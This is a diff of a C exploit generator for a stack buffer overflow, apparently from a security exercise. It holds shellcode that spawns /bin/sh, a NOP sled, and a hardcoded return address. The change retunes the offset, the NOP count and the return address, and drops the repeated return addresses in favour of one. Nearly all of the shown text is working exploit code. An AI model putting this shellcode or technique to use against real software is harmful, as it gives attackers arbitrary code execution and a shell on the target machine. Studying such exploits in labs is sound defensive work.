@@ -12,11 +12,10 @@ static char shellcode[] =
   "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
   "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
-const int OFFSET = 408;
-const int NOP_COUNT = 200;
+const int OFFSET = 404;
 const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
-const int RETURN_ADDRESS_COUNT = (OFFSET - NOP_COUNT - SHELLCODE_LENGTH) / 4;
-const char* RETURN_ADDRESS = "\xac\xd5\xff\xff";  // 0xffffd5ac
+const int NOP_COUNT = OFFSET - SHELLCODE_LENGTH - 4;
+const char* RETURN_ADDRESS = "\x30\xd3\xff\xff";  // 0xffffd330
 
 int main(void)
 {
@@ -33,12 +32,8 @@ int main(void)
   // Add the shellcode
   memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);
 
-  // Add the return addresses
-  char *return_address_ptr = buf + NOP_COUNT + SHELLCODE_LENGTH;
-  for (int i = 0; i < RETURN_ADDRESS_COUNT; i++) {
-    memcpy(return_address_ptr, RETURN_ADDRESS, 4);
-    return_address_ptr += 4;
-  }
+  // Add the return address
+  memcpy(buf + NOP_COUNT + SHELLCODE_LENGTH, RETURN_ADDRESS, 4);
 
   // Null-terminate the exploit string
   buf[OFFSET] = '\0';
